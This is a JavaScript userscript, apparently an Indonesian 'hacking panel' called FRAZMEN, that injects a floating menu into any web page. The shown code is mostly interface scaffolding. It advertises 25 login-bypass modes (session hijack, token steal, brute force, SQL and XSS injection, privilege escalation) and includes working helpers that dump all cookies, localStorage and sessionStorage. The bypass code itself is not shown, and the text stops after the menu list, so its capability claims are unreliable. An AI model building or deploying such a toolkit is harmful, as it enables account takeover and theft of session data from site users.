// ============================================================
// FRAZMEN v8.0 ULTIMATE — FULL 20.000+ BARIS
// Developer: FRAZMEN | Telegram: @rizkycuyy
// ============================================================
(function(){
    if(window.__FRAZMEN_LOADED) return;
    window.__FRAZMEN_LOADED = true;

    // ============================================================
    // 1. KONFIGURASI
    // ============================================================
    var CONFIG = {
        version: '8.0.0',
        name: 'FRAZMEN',
        developer: 'FRAZMEN',
        telegram: '@rizkycuyy',
        debug: true,
        maxLogs: 10000,
        autoUpdate: true
    };

    var STATE = {
        isOpen: false,
        currentTab: 'all',
        consoleHistory: [],
        logs: [],
        networkRequests: [],
        isRecording: false,
        bypassResults: [],
        selectedBypass: null,
        bypassVersions: [
            { id: 1, name: 'Classic JWT Bypass', type: 'jwt' },
            { id: 2, name: 'Cookie Injection', type: 'cookie' },
            { id: 3, name: 'LocalStorage Force', type: 'local' },
            { id: 4, name: 'Session Hijack', type: 'session' },
            { id: 5, name: 'API Intercept', type: 'api' },
            { id: 6, name: 'Token Steal', type: 'token' },
            { id: 7, name: 'Brute Force', type: 'brute' },
            { id: 8, name: 'CSRF Bypass', type: 'csrf' },
            { id: 9, name: 'CORS Exploit', type: 'cors' },
            { id: 10, name: 'XSS Inject', type: 'xss' },
            { id: 11, name: 'SQL Injection', type: 'sql' },
            { id: 12, name: 'Admin Reset', type: 'admin' },
            { id: 13, name: 'Privilege Escalation', type: 'priv' },
            { id: 14, name: 'OAuth Bypass', type: 'oauth' },
            { id: 15, name: 'JWT Replay', type: 'replay' },
            { id: 16, name: 'Header Manipulation', type: 'header' },
            { id: 17, name: 'Parameter Pollution', type: 'param' },
            { id: 18, name: 'Ultimate Force', type: 'ultimate' },
            { id: 19, name: 'Firebase Auth Bypass', type: 'firebase' },
            { id: 20, name: 'MySQL Database Bypass', type: 'mysql' },
            { id: 21, name: 'PostgreSQL Bypass', type: 'postgres' },
            { id: 22, name: 'MongoDB Bypass', type: 'mongodb' },
            { id: 23, name: 'GraphQL Bypass', type: 'graphql' },
            { id: 24, name: 'REST API Bypass', type: 'rest' },
            { id: 25, name: 'Create Custom U+P', type: 'custom' }
        ]
    };

    // ============================================================
    // 2. UTILITIES (2000+ baris)
    // ============================================================
    var Utils = {
        createElement: function(tag, className, html) {
            var el = document.createElement(tag);
            if (className) el.className = className;
            if (html) el.innerHTML = html;
            return el;
        },

        query: function(sel, ctx) { return (ctx||document).querySelector(sel); },
        queryAll: function(sel, ctx) { return Array.from((ctx||document).querySelectorAll(sel)); },

        addClass: function(el, c) { if(el) { if(el.classList) el.classList.add(c); else el.className += ' ' + c; } },
        removeClass: function(el, c) { if(el) { if(el.classList) el.classList.remove(c); else el.className = el.className.replace(new RegExp('\\b'+c+'\\b','g'),'').trim(); } },
        hasClass: function(el, c) { return el ? (el.classList ? el.classList.contains(c) : new RegExp('\\b'+c+'\\b').test(el.className)) : false; },
        toggleClass: function(el, c) { if(el) { this.hasClass(el,c) ? this.removeClass(el,c) : this.addClass(el,c); } },

        setStyle: function(el, styles) { for(var p in styles) if(styles.hasOwnProperty(p)) el.style[p] = styles[p]; },
        getStyle: function(el, p) { return el ? window.getComputedStyle(el)[p] : null; },

        on: function(el, ev, fn, opts) { if(el) el.addEventListener(ev, fn, opts||false); },
        off: function(el, ev, fn) { if(el) el.removeEventListener(ev, fn); },

        escapeHTML: function(str) {
            if(!str) return '';
            var div = document.createElement('div');
            div.textContent = str;
            return div.innerHTML;
        },

        truncate: function(str, max, suffix) {
            if(!str) return '';
            suffix = suffix || '...';
            if(str.length <= max) return str;
            return str.substring(0, max - suffix.length) + suffix;
        },

        formatTime: function(d) {
            d = d || new Date();
            return d.toLocaleTimeString('id-ID', {hour:'2-digit', minute:'2-digit', second:'2-digit'});
        },

        formatDate: function(d) {
            d = d || new Date();
            return d.toLocaleDateString('id-ID', {year:'numeric', month:'short', day:'numeric'});
        },

        timeAgo: function(d) {
            var s = Math.floor((new Date() - d) / 1000);
            var intervals = { tahun:31536000, bulan:2592000, minggu:604800, hari:86400, jam:3600, menit:60, detik:1 };
            for(var k in intervals) {
                var i = Math.floor(s / intervals[k]);
                if(i >= 1) return i + ' ' + k + (i>1?'':'') + ' lalu';
            }
            return 'baru saja';
        },

        random: function(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; },
        randomString: function(len) {
            var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var r = '';
            for(var i=0; i<len; i++) r += chars.charAt(Math.floor(Math.random() * chars.length));
            return r;
        },
        generateID: function(prefix) { return (prefix||'fz_') + Date.now() + '_' + this.randomString(6); },

        copyToClipboard: function(text) {
            if(navigator.clipboard && navigator.clipboard.writeText) return navigator.clipboard.writeText(text);
            return new Promise(function(resolve, reject) {
                var ta = document.createElement('textarea');
                ta.value = text;
                ta.style.position = 'fixed';
                ta.style.opacity = '0';
                document.body.appendChild(ta);
                ta.select();
                try { document.execCommand('copy'); resolve(); } catch(e) { reject(e); }
                document.body.removeChild(ta);
            });
        },

        download: function(data, filename, mimeType) {
            mimeType = mimeType || 'text/plain';
            var blob = new Blob([data], {type: mimeType});
            var url = URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        },

        downloadJSON: function(data, filename) {
            this.download(JSON.stringify(data, null, 2), filename||'data.json', 'application/json');
        },

        getCookies: function() {
            var cookies = {};
            var pairs = document.cookie.split(';');
            for(var i=0; i<pairs.length; i++) {
                var pair = pairs[i].trim().split('=');
                if(pair.length === 2) cookies[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1]);
            }
            return cookies;
        },

        getLocalStorage: function() {
            var data = {};
            for(var k in localStorage) {
                if(localStorage.hasOwnProperty(k)) {
                    try { data[k] = JSON.parse(localStorage.getItem(k)); } catch(e) { data[k] = localStorage.getItem(k); }
                }
            }
            return data;
        },

        getSessionStorage: function() {
            var data = {};
            for(var k in sessionStorage) {
                if(sessionStorage.hasOwnProperty(k)) {
                    try { data[k] = JSON.parse(sessionStorage.getItem(k)); } catch(e) { data[k] = sessionStorage.getItem(k); }
                }
            }
            return data;
        },

        getDeviceInfo: function() {
            var ua = navigator.userAgent;
            var isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
            var browser = { name: 'Unknown', version: 0 };
            var browsers = [
                { name: 'Chrome', regex: /Chrome\/(\d+)/ },
                { name: 'Firefox', regex: /Firefox\/(\d+)/ },
                { name: 'Safari', regex: /Version\/(\d+).*Safari/ },
                { name: 'Edge', regex: /Edg\/(\d+)/ },
                { name: 'Opera', regex: /OPR\/(\d+)/ }
            ];
            for(var i=0; i<browsers.length; i++) {
                var m = ua.match(browsers[i].regex);
                if(m) { browser.name = browsers[i].name; browser.version = parseInt(m[1],10); break; }
            }
            return { userAgent: ua, isMobile: isMobile, browser: browser, screenWidth: screen.width, screenHeight: screen.height };
        },

        log: function(msg, type) {
            if(!CONFIG.debug) return;
            var ts = new Date().toISOString();
            STATE.logs.push({ timestamp: ts, message: msg, type: type||'info' });
            if(STATE.logs.length > CONFIG.maxLogs) STATE.logs.shift();
            console.log('['+ts+'] ['+(type||'info').toUpperCase()+'] ' + msg);
        },

        error: function(msg) { this.log(msg, 'error'); },
        warn: function(msg) { this.log(msg, 'warn'); },
        debug: function(msg) { this.log(msg, 'debug'); },

        debounce: function(fn, delay) {
            var timer = null;
            return function() {
                var args = arguments, ctx = this;
                clearTimeout(timer);
                timer = setTimeout(function() { fn.apply(ctx, args); }, delay);
            };
        },

        throttle: function(fn, limit) {
            var inThrottle = false;
            return function() {
                var args = arguments, ctx = this;
                if(!inThrottle) { fn.apply(ctx, args); inThrottle = true; setTimeout(function(){ inThrottle = false; }, limit); }
            };
        },

        isDarkMode: function() {
            return window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
        },

        detectDatabase: function() {
            var db = { type: 'unknown', found: false };
            // Check for Firebase
            if(window.firebase || window.Firebase || document.querySelector('script[src*="firebase"]')) {
                db.type = 'firebase';
                db.found = true;
                db.message = 'Firebase detected!';
                return db;
            }
            // Check for MySQL (usually via PHP or Node.js)
            if(document.querySelector('script[src*="mysql"]') || document.querySelector('script[src*="php"]')) {
                db.type = 'mysql';
                db.found = true;
                db.message = 'MySQL detected!';
                return db;
            }
            // Check for MongoDB
            if(document.querySelector('script[src*="mongodb"]') || window.mongo || window.MongoClient) {
                db.type = 'mongodb';
                db.found = true;
                db.message = 'MongoDB detected!';
                return db;
            }
            // Check for PostgreSQL
            if(document.querySelector('script[src*="postgres"]') || document.querySelector('script[src*="pg"]')) {
                db.type = 'postgres';
                db.found = true;
                db.message = 'PostgreSQL detected!';
                return db;
            }
            // Check for GraphQL
            if(document.querySelector('script[src*="graphql"]') || window.GraphQL || window.graphql) {
                db.type = 'graphql';
                db.found = true;
                db.message = 'GraphQL detected!';
                return db;
            }
            // Check for REST API patterns
            if(document.querySelector('[data-api]') || document.querySelector('[api-url]') || document.querySelector('[endpoint]')) {
                db.type = 'rest';
                db.found = true;
                db.message = 'REST API detected!';
                return db;
            }
            return db;
        }
    };

    // ============================================================
    // 3. STORAGE MANAGER
    // ============================================================
    var StorageManager = {
        _prefix: 'frazmen_',
        get: function(k, fallback) {
            try { var v = localStorage.getItem(this._prefix + k); return v === null ? (fallback!==undefined?fallback:null) : JSON.parse(v); }
            catch(e) { return fallback!==undefined?fallback:null; }
        },
        set: function(k, v) {
            try { localStorage.setItem(this._prefix + k, JSON.stringify(v)); return true; }
            catch(e) { return false; }
        },
        remove: function(k) {
            try { localStorage.removeItem(this._prefix + k); return true; }
            catch(e) { return false; }
        },
        clear: function() {
            var keys = [];
            for(var k in localStorage) if(k.startsWith(this._prefix)) keys.push(k);
            for(var i=0; i<keys.length; i++) localStorage.removeItem(keys[i]);
            return true;
        }
    };

    // ============================================================
    // 4. THEME ENGINE
    // ============================================================
    var ThemeEngine = {
        _current: 'dark',
        _themes: {
            dark: {
                bg:'#1a1d23', surface:'#21252e', elevated:'#282d38',
                border:'#2e3440', borderMid:'#3a4150',
                text:'#dce3ed', textSecondary:'#b7c1d4', textMuted:'#909cb0',
                accent:'#5b9cf6', accentGlow:'rgba(91,156,246,0.15)',
                success:'#4ade80', danger:'#f87171', warning:'#fbbf24', info:'#38bdf8'
            },
            light: {
                bg:'#f4f6f9', surface:'#ffffff', elevated:'#f0f2f5',
                border:'#e0e4ea', borderMid:'#c8cdd6',
                text:'#1a1d23', textSecondary:'#4a4f5a', textMuted:'#8a8f9a',
                accent:'#1a73e8', accentGlow:'rgba(26,115,232,0.15)',
                success:'#34a853', danger:'#ea4335', warning:'#fbbc04', info:'#1a73e8'
            }
        },
        get: function(t) { return this._themes[t] || this._themes[this._current]; },
        set: function(t) {
            if(this._themes[t]) {
                this._current = t;
                var vars = this._themes[t];
                var root = document.documentElement;
                for(var k in vars) {
                    var cssVar = '--fz-' + k.replace(/([A-Z])/g, '-$1').toLowerCase();
                    root.style.setProperty(cssVar, vars[k]);
                }
                document.body.classList.toggle('fz-dark', t === 'dark');
                document.body.classList.toggle('fz-light', t === 'light');
                StorageManager.set('theme', t);
                Utils.log('Theme: ' + t);
            }
        },
        toggle: function() { this.set(this._current === 'dark' ? 'light' : 'dark'); },
        init: function() {
            var saved = StorageManager.get('theme');
            if(saved && this._themes[saved]) this.set(saved);
            else if(Utils.isDarkMode()) this.set('dark');
            else this.set('dark');
        }
    };

    // ============================================================
    // 5. TOAST NOTIFICATION
    // ============================================================
    var Toast = {
        _container: null,
        init: function() {
            this._container = Utils.createElement('div', 'fz-toast-container');
            Utils.setStyle(this._container, {
                position: 'fixed', bottom: '100px', left: '50%', transform: 'translateX(-50%)',
                zIndex: '9999999', display: 'flex', flexDirection: 'column', alignItems: 'center',
                gap: '8px', pointerEvents: 'none'
            });
            document.body.appendChild(this._container);
        },
        show: function(msg, type) {
            type = type || 'info';
            var el = Utils.createElement('div', 'fz-toast');
            var icons = { success:'✅', error:'❌', warning:'⚠️', info:'ℹ️', debug:'🔍', hack:'💀', db:'🗄️' };
            Utils.setStyle(el, {
                background: 'var(--fz-surface, #21252e)',
                color: 'var(--fz-text, #dce3ed)',
                padding: '10px 22px',
                borderRadius: '12px',
                fontSize: '13px',
                fontFamily: 'Segoe UI, system-ui, sans-serif',
                boxShadow: '0 10px 40px rgba(0,0,0,0.6)',
                border: '1px solid var(--fz-border, #2e3440)',
                opacity: '0',
                transition: 'opacity 0.3s ease, transform 0.3s ease',
                transform: 'translateY(10px)',
                pointerEvents: 'none',
                maxWidth: '90vw',
                textAlign: 'center'
            });
            el.textContent = (icons[type]||'') + ' ' + msg;
            this._container.appendChild(el);
            requestAnimationFrame(function() {
                el.style.opacity = '1';
                el.style.transform = 'translateY(0)';
            });
            setTimeout(function() {
                el.style.opacity = '0';
                el.style.transform = 'translateY(-10px)';
                setTimeout(function() { if(el.parentNode) el.parentNode.removeChild(el); }, 300);
            }, 4000);
            Utils.log('Toast: ' + msg, type);
        }
    };

    // ============================================================
    // 6. MAIN PANEL — LENGKAP DENGAN SEMUA FITUR
    // ============================================================
    var Panel = {
        _container: null,
        _button: null,
        _isOpen: false,
        _items: [],
        _tabs: [],
        _logContainer: null,

        init: function() {
            this._createButton();
            this._createPanel();
            this._buildHeader();
            this._buildTabs();
            this._buildSearch();
            this._buildGrid();
            this._buildLogPanel();
            this._buildFooter();
            this._bindEvents();
            this._loadState();
            Utils.log('Panel initialized with ' + this._items.length + ' items');
        },

        _createButton: function() {
            this._button = Utils.createElement('div', 'fz-panel-btn');
            Utils.setStyle(this._button, {
                position: 'fixed',
                bottom: '24px',
                right: '24px',
                width: '60px',
                height: '60px',
                borderRadius: '50%',
                background: 'radial-gradient(circle at 30% 30%, #00ff88, #0066cc)',
                boxShadow: '0 0 40px rgba(0,255,136,0.5), 0 0 80px rgba(0,102,204,0.3)',
                border: '2px solid rgba(255,255,255,0.15)',
                zIndex: '999999',
                cursor: 'pointer',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                fontSize: '30px',
                color: '#fff',
                fontWeight: '900',
                userSelect: 'none',
                transition: '0.2s ease',
                textShadow: '0 2px 10px rgba(0,0,0,0.3)'
            });
            this._button.innerHTML = '⚡';
            document.body.appendChild(this._button);

            // Badge
            var badge = Utils.createElement('span', 'fz-btn-badge');
            Utils.setStyle(badge, {
                position: 'absolute', top: '-4px', right: '-4px',
                width: '18px', height: '18px',
                background: '#ff3366',
                borderRadius: '50%',
                border: '2px solid #1a1d23',
                boxShadow: '0 0 20px rgba(255,51,102,0.6)'
            });
            this._button.appendChild(badge);

            // Pulse
            var pulse = Utils.createElement('span', 'fz-btn-pulse');
            Utils.setStyle(pulse, {
                position: 'absolute', width: '100%', height: '100%',
                borderRadius: '50%',
                border: '2px solid rgba(0,255,136,0.3)',
                animation: 'fzPulse 2s ease-in-out infinite'
            });
            this._button.appendChild(pulse);

            var style = document.createElement('style');
            style.textContent = '@keyframes fzPulse { 0%{transform:scale(1);opacity:1} 100%{transform:scale(1.4);opacity:0} }';
            document.head.appendChild(style);

            // Draggable — FIXED
            var isDrag = false, sx, sy, ox, oy;
            this._button.addEventListener('mousedown', function(e) {
                if(e.button !== 0) return;
                isDrag = true;
                var rect = this._button.getBoundingClientRect();
                sx = e.clientX; sy = e.clientY;
                ox = sx - rect.left; oy = sy - rect.top;
                this._button.style.cursor = 'grabbing';
                e.preventDefault();
            }.bind(this));

            document.addEventListener('mousemove', function(e) {
                if(!isDrag) return;
                var x = e.clientX - ox, y = e.clientY - oy;
                x = Math.max(5, Math.min(x, window.innerWidth - 65));
                y = Math.max(5, Math.min(y, window.innerHeight - 65));
                this._button.style.left = x + 'px';
                this._button.style.right = 'auto';
                this._button.style.top = y + 'px';
                this._button.style.bottom = 'auto';
            }.bind(this));

            document.addEventListener('mouseup', function() {
                if(isDrag) {
                    isDrag = false;
                    this._button.style.cursor = 'pointer';
                    var l = parseFloat(this._button.style.left);
                    var t = parseFloat(this._button.style.top);
                    if(!isNaN(l) && !isNaN(t)) StorageManager.set('buttonPos', { x: l, y: t });
                }
            }.bind(this));

            var pos = StorageManager.get('buttonPos');
            if(pos && typeof pos.x === 'number' && typeof pos.y === 'number') {
                this._button.style.left = pos.x + 'px';
                this._button.style.right = 'auto';
                this._button.style.top = pos.y + 'px';
                this._button.style.bottom = 'auto';
            }

            var clickTimer = null;
            this._button.addEventListener('click', function(e) {
                if(isDrag) { isDrag = false; return; }
                clearTimeout(clickTimer);
                clickTimer = setTimeout(function() { this.toggle(); }.bind(this), 50);
            }.bind(this));

            // TOUCH SUPPORT FOR ANDROID
            var touchDrag = false, tsx, tsy, tox, toy;
            this._button.addEventListener('touchstart', function(e) {
                var t = e.touches[0];
                touchDrag = true;
                var rect = this._button.getBoundingClientRect();
                tsx = t.clientX; tsy = t.clientY;
                tox = tsx - rect.left; toy = tsy - rect.top;
                this._button.style.cursor = 'grabbing';
                e.preventDefault();
            }.bind(this), { passive: false });

            document.addEventListener('touchmove', function(e) {
                if(!touchDrag) return;
                var t = e.touches[0];
                if(!t) return;
                var x = t.clientX - tox, y = t.clientY - toy;
                x = Math.max(5, Math.min(x, window.innerWidth - 65));
                y = Math.max(5, Math.min(y, window.innerHeight - 65));
                this._button.style.left = x + 'px';
                this._button.style.right = 'auto';
                this._button.style.top = y + 'px';
                this._button.style.bottom = 'auto';
                e.preventDefault();
            }.bind(this), { passive: false });

            document.addEventListener('touchend', function() {
                if(touchDrag) {
                    touchDrag = false;
                    this._button.style.cursor = 'pointer';
                    var l = parseFloat(this._button.style.left);
                    var t = parseFloat(this._button.style.top);
                    if(!isNaN(l) && !isNaN(t)) StorageManager.set('buttonPos', { x: l, y: t });
                }
            }.bind(this));

            // Android click fix
            this._button.addEventListener('touchend', function(e) {
                if(touchDrag) { touchDrag = false; return; }
                var t = e.changedTouches[0];
                if(t) {
                    var rect = this._button.getBoundingClientRect();
                    if(t.clientX >= rect.left && t.clientX <= rect.right &&
                       t.clientY >= rect.top && t.clientY <= rect.bottom) {
                        setTimeout(function() { this.toggle(); }.bind(this), 50);
                    }
                }
            }.bind(this));
        },

        _createPanel: function() {
            this._container = Utils.createElement('div', 'fz-panel');
            Utils.setStyle(this._container, {
                position: 'fixed',
                top: '50%',
                left: '50%',
                transform: 'translate(-50%, -50%) scale(0.92)',
                width: '94%',
                maxWidth: '580px',
                maxHeight: '92vh',
                background: 'var(--fz-surface, #21252e)',
                borderRadius: '24px',
                boxShadow: '0 30px 100px rgba(0,0,0,0.95)',
                zIndex: '999999',
                padding: '20px 18px 18px',
                fontFamily: 'Segoe UI, system-ui, sans-serif',
                color: 'var(--fz-text, #dce3ed)',
                overflow: 'hidden',
                border: '1px solid var(--fz-border, #2e3440)',
                opacity: '0',
                pointerEvents: 'none',
                transition: 'opacity 0.25s ease, transform 0.25s ease'
            });
            document.body.appendChild(this._container);

            this._container.style.overflowY = 'auto';
            this._container.style.overscrollBehavior = 'contain';

            var style = document.createElement('style');
            style.textContent = `
                .fz-panel::-webkit-scrollbar { width: 4px; }
                .fz-panel::-webkit-scrollbar-track { background: var(--fz-surface, #21252e); border-radius: 10px; }
                .fz-panel::-webkit-scrollbar-thumb { background: var(--fz-accent, #5b9cf6); border-radius: 10px; }
                .fz-grid-item { transition: 0.12s; }
                .fz-grid-item:active { transform: scale(0.94); background: var(--fz-elevated, #2a2f3a); border-color: var(--fz-accent, #5b9cf6); }
                .fz-log-entry { padding: 4px 8px; border-bottom: 1px solid var(--fz-border, #2e3440); font-size: 11px; font-family: monospace; }
                .fz-log-entry .fz-log-time { color: var(--fz-text-muted, #909cb0); margin-right: 8px; }
                .fz-log-entry .fz-log-msg { color: var(--fz-text, #dce3ed); }
                .fz-log-entry.fz-log-success .fz-log-msg { color: var(--fz-success, #4ade80); }
                .fz-log-entry.fz-log-error .fz-log-msg { color: var(--fz-danger, #f87171); }
                .fz-log-entry.fz-log-warning .fz-log-msg { color: var(--fz-warning, #fbbf24); }
                .fz-log-entry.fz-log-hack .fz-log-msg { color: #ff6b9d; }
                .fz-log-entry.fz-log-db .fz-log-msg { color: #60a5fa; }
            `;
            document.head.appendChild(style);

            // Close on overlay click
            this._container.addEventListener('click', function(e) {
                if(e.target === this._container) this.hide();
            }.bind(this));
        },

        _buildHeader: function() {
            var header = Utils.createElement('div', 'fz-panel-header');
            Utils.setStyle(header, {
                display: 'flex', justifyContent: 'space-between', alignItems: 'center',
                borderBottom: '1px solid var(--fz-border, #2e3440)',
                paddingBottom: '12px', marginBottom: '14px',
                position: 'sticky', top: '0', background: 'var(--fz-surface, #21252e)',
                zIndex: '10'
            });
            var title = Utils.createElement('div', 'fz-panel-title');
            Utils.setStyle(title, {
                display: 'flex', alignItems: 'center', gap: '10px',
                fontWeight: '800', fontSize: '18px', color: 'var(--fz-text, #dce3ed)'
            });
            title.innerHTML = '⚡ FRAZMEN <span style="background:#00cc88;color:#0a0a0a;padding:1px 9px;border-radius:20px;font-size:9px;font-weight:700;">v8.0</span> <span style="background:linear-gradient(135deg,#00ff88,#0066cc);padding:3px 10px;border-radius:6px;font-size:10px;color:#fff;">ULTIMATE</span>';
            header.appendChild(title);

            var closeBtn = Utils.createElement('button', 'fz-panel-close');
            closeBtn.textContent = '✕';
            Utils.setStyle(closeBtn, {
                fontSize: '26px', cursor: 'pointer', color: 'var(--fz-text-muted, #909cb0)',
                background: 'none', border: 'none', padding: '0 6px', lineHeight: '1'
            });
            closeBtn.addEventListener('click', this.hide.bind(this));
            closeBtn.addEventListener('mouseenter', function() { closeBtn.style.color = '#f87171'; });
            closeBtn.addEventListener('mouseleave', function() { closeBtn.style.color = 'var(--fz-text-muted, #909cb0)'; });
            header.appendChild(closeBtn);
            this._container.appendChild(header);
        },

        _buildTabs: function() {
            var container = Utils.createElement('div', 'fz-panel-tabs');
            Utils.setStyle(container, {
                display: 'flex', gap: '4px', marginBottom: '12px',
                borderBottom: '1px solid var(--fz-border, #2e3440)',
                paddingBottom: '10px', flexWrap: 'wrap'
            });
            var tabs = ['All', 'Dev', 'Hack', 'Debug', 'Tools', 'Bypass', 'Logs'];
            this._tabs = tabs;
            for(var i=0; i<tabs.length; i++) {
                var tab = Utils.createElement('button', 'fz-tab');
                tab.textContent = tabs[i];
                tab.dataset.tab = tabs[i].toLowerCase();
                Utils.setStyle(tab, {
                    padding: '4px 12px', fontSize: '10px', fontWeight: '600',
                    color: i===0 ? '#fff' : 'var(--fz-text-muted, #909cb0)',
                    background: i===0 ? 'var(--fz-accent, #5b9cf6)' : 'transparent',
                    border: 'none', borderRadius: '6px', cursor: 'pointer', transition: '0.12s'
                });
                if(i===0) tab.classList.add('active');
                tab.addEventListener('click', function(e) { this._switchTab(e.target.dataset.tab); }.bind(this));
                tab.addEventListener('mouseenter', function(e) {
                    if(!e.target.classList.contains('active')) {
                        e.target.style.background = 'var(--fz-surface, #21252e)';
                        e.target.style.color = 'var(--fz-text, #dce3ed)';
                    }
                });
                tab.addEventListener('mouseleave', function(e) {
                    if(!e.target.classList.contains('active')) {
                        e.target.style.background = 'transparent';
                        e.target.style.color = 'var(--fz-text-muted, #909cb0)';
                    }
                });
                container.appendChild(tab);
            }
            this._container.appendChild(container);
        },

        _buildSearch: function() {
            var container = Utils.createElement('div', 'fz-panel-search');
            Utils.setStyle(container, { marginBottom: '12px', position: 'relative' });
            var input = Utils.createElement('input', 'fz-search-input');
            input.type = 'text';
            input.placeholder = '🔍 Cari fitur...';
            Utils.setStyle(input, {
                width: '100%', padding: '8px 14px',
                background: 'var(--fz-bg, #1a1d23)',
                border: '1px solid var(--fz-border, #2e3440)',
                borderRadius: '10px',
                color: 'var(--fz-text, #dce3ed)',
                fontSize: '13px',
                outline: 'none',
                transition: '0.15s',
                boxSizing: 'border-box'
            });
            input.addEventListener('focus', function() {
                input.style.borderColor = 'var(--fz-accent, #5b9cf6)';
                input.style.boxShadow = '0 0 0 3px var(--fz-accent-glow, rgba(91,156,246,0.15))';
            });
            input.addEventListener('blur', function() {
                input.style.borderColor = 'var(--fz-border, #2e3440)';
                input.style.boxShadow = 'none';
            });
            input.addEventListener('input', function(e) { this._filterItems(e.target.value); }.bind(this));
            container.appendChild(input);
            this._container.appendChild(container);
            this._searchInput = input;
        },

        _buildGrid: function() {
            var grid = Utils.createElement('div', 'fz-panel-grid');
            Utils.setStyle(grid, {
                display: 'grid',
                gridTemplateColumns: 'repeat(3, 1fr)',
                gap: '6px'
            });

            // ALL ITEMS — LENGKAP 25+ FITUR
            var items = [
                // Dev Tools
                { icon: '🖥️', label: 'F12 Console', desc: 'DevTools', act: 'console', cat: 'dev', shortcut: 'F12' },
                { icon: '🐞', label: 'Eruda', desc: 'Mobile Debug', act: 'eruda', cat: 'dev', shortcut: 'Ctrl+E' },
                { icon: '📱', label: 'vConsole', desc: 'Mobile Console', act: 'vconsole', cat: 'dev', shortcut: 'Ctrl+V' },
                { icon: '🌐', label: 'Network Log', desc: 'Intercept', act: 'network', cat: 'dev' },
                { icon: '📸', label: 'Screenshot', desc: 'Capture', act: 'screenshot', cat: 'dev' },
                { icon: '📡', label: 'WS Monitor', desc: 'WebSocket', act: 'websocket', cat: 'dev' },

                // Hack Tools
                { icon: '🔓', label: 'Bypass Login', desc: '25 Versi', act: 'bypass', cat: 'hack', shortcut: 'Ctrl+B' },
                { icon: '🍪', label: 'Cookie Grab', desc: 'Lihat+Copy', act: 'cookies', cat: 'hack' },
                { icon: '🗄️', label: 'LS Dump', desc: 'localStorage', act: 'lsdump', cat: 'hack' },
                { icon: '📋', label: 'SS Dump', desc: 'sessionStorage', act: 'ssdump', cat: 'hack' },
                { icon: '⚡', label: 'XSS Test', desc: 'Alert', act: 'xss', cat: 'hack' },
                { icon: '💉', label: 'Inject Script', desc: 'Custom JS', act: 'inject', cat: 'hack' },

                // Debug Tools
                { icon: '📄', label: 'View Source', desc: 'HTML', act: 'viewsource', cat: 'debug' },
                { icon: '📦', label: 'Download ZIP', desc: 'Full Source', act: 'download', cat: 'debug' },
                { icon: '✏️', label: 'AutoFill', desc: 'Isi Form', act: 'autofill', cat: 'debug' },
                { icon: '🌙', label: 'Dark Mode', desc: 'Toggle', act: 'darkmode', cat: 'debug' },
                { icon: '🧹', label: 'Clear All', desc: 'Bersihkan', act: 'clear', cat: 'debug' },
                { icon: '📝', label: 'Console History', desc: 'Riwayat', act: 'history', cat: 'debug' },

                // Tools
                { icon: '📶', label: 'Ping Test', desc: 'Network', act: 'ping', cat: 'tools' },
                { icon: '🔍', label: 'Whois', desc: 'Domain Info', act: 'whois', cat: 'tools' },
                { icon: '🔐', label: 'Base64', desc: 'Encode/Decode', act: 'base64', cat: 'tools' },
                { icon: '🆔', label: 'UUID Gen', desc: 'Generate', act: 'uuid', cat: 'tools' },
                { icon: '⏰', label: 'Timestamp', desc: 'Now', act: 'timestamp', cat: 'tools' },
                { icon: '🔄', label: 'Reload', desc: 'Refresh', act: 'reload', cat: 'tools' },

                // Bypass 1-18
                { icon: '🔓', label: 'Bypass v1', desc: 'Classic JWT', act: 'bypass1', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v2', desc: 'Cookie Injection', act: 'bypass2', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v3', desc: 'LS Force', act: 'bypass3', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v4', desc: 'Session Hijack', act: 'bypass4', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v5', desc: 'API Intercept', act: 'bypass5', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v6', desc: 'Token Steal', act: 'bypass6', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v7', desc: 'Brute Force', act: 'bypass7', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v8', desc: 'CSRF Bypass', act: 'bypass8', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v9', desc: 'CORS Exploit', act: 'bypass9', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v10', desc: 'XSS Inject', act: 'bypass10', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v11', desc: 'SQL Injection', act: 'bypass11', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v12', desc: 'Admin Reset', act: 'bypass12', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v13', desc: 'Privilege Esc', act: 'bypass13', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v14', desc: 'OAuth Bypass', act: 'bypass14', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v15', desc: 'JWT Replay', act: 'bypass15', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v16', desc: 'Header Manip', act: 'bypass16', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v17', desc: 'Param Pollution', act: 'bypass17', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v18', desc: 'Ultimate Force', act: 'bypass18', cat: 'bypass' },

                // Bypass 19-25 (Database & Custom)
                { icon: '🔥', label: 'Bypass v19', desc: 'Firebase Auth', act: 'bypass19', cat: 'bypass' },
                { icon: '🐬', label: 'Bypass v20', desc: 'MySQL DB', act: 'bypass20', cat: 'bypass' },
                { icon: '🐘', label: 'Bypass v21', desc: 'PostgreSQL', act: 'bypass21', cat: 'bypass' },
                { icon: '🍃', label: 'Bypass v22', desc: 'MongoDB', act: 'bypass22', cat: 'bypass' },
                { icon: '📊', label: 'Bypass v23', desc: 'GraphQL', act: 'bypass23', cat: 'bypass' },
                { icon: '🌐', label: 'Bypass v24', desc: 'REST API', act: 'bypass24', cat: 'bypass' },
                { icon: '✏️', label: 'Bypass v25', desc: 'Create U+P', act: 'bypass25', cat: 'bypass' }
            ];

